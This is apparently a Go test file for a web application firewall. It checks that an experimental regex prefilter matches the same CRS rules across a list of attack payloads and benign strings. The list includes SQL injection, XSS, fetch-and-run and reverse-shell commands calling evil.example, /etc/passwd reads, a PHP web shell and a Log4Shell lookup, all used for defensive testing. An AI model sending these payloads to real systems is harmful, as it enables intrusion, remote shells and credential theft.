package waf

import (
	"encoding/json"
	"net/url"
	"slices"
	"testing"

	"palisade/internal/config"
)

// TestRxPreFilterSameMatches guards the experimental SecRxPreFilter (issue
// #292): with and without it, CRS must match exactly the same rules for
// attacks from every family and for ordinary values, carried in the query
// string, a JSON body and a header.
func TestRxPreFilterSameMatches(t *testing.T) {
	with := newTestEngine(t)
	old := rxPreFilter
	rxPreFilter = ""
	without, err := New(config.WAFConfig{Enabled: true}, nil)
	rxPreFilter = old
	if err != nil {
		t.Fatal(err)
	}
	payloads := []string{
		// SQLi
		"1' OR '1'='1", "1 UNION SELECT username, password FROM users--", "1; WAITFOR DELAY '0:0:5'--",
		"1 AND SLEEP(5)", "admin'/**/OR/**/1=1#", "1' AND extractvalue(1,concat(0x7e,version()))--",
		"'; EXEC xp_cmdshell('dir')--", "1 OR benchmark(10000000,md5(1))",
		// XSS
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
		"<svg/onload=alert(1)>", `"><iframe src="data:text/html,<script>alert(1)</script>">`, "<a href=\"jav&#x09;ascript:alert(1)\">",
		// RCE, Unix and Windows
		"127.0.0.1; cat /etc/passwd", "$(curl http://evil.example/x.sh|sh)", "`id`", "| nc -e /bin/sh evil.example 4444",
		"; powershell -enc SQBFAFgA", "& cmd.exe /c whoami", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		// LFI / RFI
		"../../../../etc/passwd", "....//....//etc/shadow", "php://filter/convert.base64-encode/resource=index.php",
		"http://evil.example/shell.txt?", "file:///etc/passwd",
		// PHP, Java, Node, SSTI, Log4Shell
		"<?php system($_GET['c']); ?>", "O:8:\"stdClass\":0:{}", "java.lang.Runtime.getRuntime().exec(\"id\")",
		"require('child_process').exec('id')", "{{7*7}}{{config.__class__.__init__.__globals__}}",
		"${jndi:ldap://evil.example/a}", "__proto__[isAdmin]=true",
		// ordinary values
		"O'Reilly books", "jane@example.com", "Leave the parcel at the door, thanks!", "2026-11-12T10:00:00Z",
		"A sturdy widget for everyday use.", "SELECT your favourite colour", "<b>bold</b> text",
	}
	for _, p := range payloads {
		body, _ := json.Marshal(map[string]string{"note": p})
		a, b := matchedRules(with, p, body), matchedRules(without, p, body)
		if !slices.Equal(a, b) {
			t.Errorf("%q: with prefilter %v, without %v", p, a, b)
		}
	}
}

func matchedRules(e *Engine, payload string, body []byte) []int {
	tx := e.waf.NewTransaction()
	defer func() { _ = tx.Close() }()
	tx.ProcessConnection("203.0.113.9", 0, "", 0)
	tx.ProcessURI("/api?q="+url.QueryEscape(payload), "POST", "HTTP/1.1")
	tx.AddRequestHeader("Host", "app.example.com")
	tx.AddRequestHeader("User-Agent", "Mozilla/5.0")
	tx.AddRequestHeader("Referer", payload)
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	_, _, _ = tx.WriteRequestBody(body)
	_, _ = tx.ProcessRequestBody()
	var ids []int
	for _, m := range tx.MatchedRules() {
		ids = append(ids, m.Rule().ID())
	}
	return ids
}
